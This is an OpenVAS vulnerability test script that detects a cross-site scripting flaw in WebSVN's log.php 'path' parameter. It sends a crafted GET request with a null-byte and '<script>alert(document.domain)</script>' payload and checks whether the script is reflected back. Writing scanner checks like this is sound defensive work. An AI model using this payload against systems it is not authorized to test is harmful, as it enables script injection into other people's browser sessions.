###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_websvn_xss_vuln.nasl 12149 2018-10-29 10:48:30Z asteins $
#
# WebSVN Cross site Scripting Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:tigris:websvn";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806882");
  script_version("$Revision: 12149 $");
  script_cve_id("CVE-2016-2511", "CVE-2016-1236");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-29 11:48:30 +0100 (Mon, 29 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-03-01 14:45:36 +0530 (Tue, 01 Mar 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("WebSVN Cross site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with WebSVN and
  is prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP Get request
  and check whether its able to read domain value or not.");

  script_tag(name:"insight", value:"The flaw is due to

  - improper validation of 'path' parameter in 'log.php' file, 'revision.php',
    'listing.php', and 'comp.php'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to create a specially crafted request that would
  execute arbitrary script code in a user's browser session within the trust
  relationship between their browser and the server.");

  script_tag(name:"affected", value:"WebSVN 2.3.3 and probably earlier versions.");

  script_tag(name:"solution", value:"As a workaround make the changes in the file
  'include/setup.php' as mentioned in the advisory at the references.");

  script_tag(name:"solution_type", value:"Workaround");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Feb/99");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/135886");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_websvn_detect.nasl");
  script_mandatory_keys("WebSVN/Installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://www.websvn.info");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!svnPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:svnPort)){
  exit(0);
}

if(dir == "/") {
  dir = "";
}

url = dir + '/log.php?path=%00";><script>alert(document.domain)</script>';

sndReq = http_get(item:url, port:svnPort);
rcvRes = http_keepalive_send_recv(port:svnPort, data:sndReq);

if(rcvRes =~ "HTTP/1\.. 200" && "WebSVN" >< rcvRes && "<script>alert(document.domain)</script>" >< rcvRes)
{
  report = report_vuln_url( port:svnPort, url:url );
  security_message(port:svnPort, data:report);
  exit(0);
}
